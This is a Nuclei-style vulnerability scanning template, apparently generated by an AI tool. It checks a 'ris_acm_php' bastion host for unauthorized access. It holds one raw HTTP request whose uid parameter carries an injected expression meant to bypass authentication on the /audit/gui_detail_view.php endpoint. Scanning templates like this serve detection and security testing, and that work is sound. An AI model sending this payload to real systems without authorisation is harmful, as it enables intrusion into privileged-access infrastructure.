id: yaml-poc-qzsec-ris_acm_php-unauthorized_access-CT-530928
info:
  name: Unauthorized Access in ris_acm_php
  author: ProjectDiscoveryAI
  severity: critical
  reference:
    - https://blog.csdn.net/weixin_43886632/article/details/117077168
  description: |
    This template checks for unauthorized access vulnerability in ris_acm_php, where a crafted request reveals sensitive information.
http:
  - raw:
      - |
        GET /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "堡垒机"
          - "错误的id"
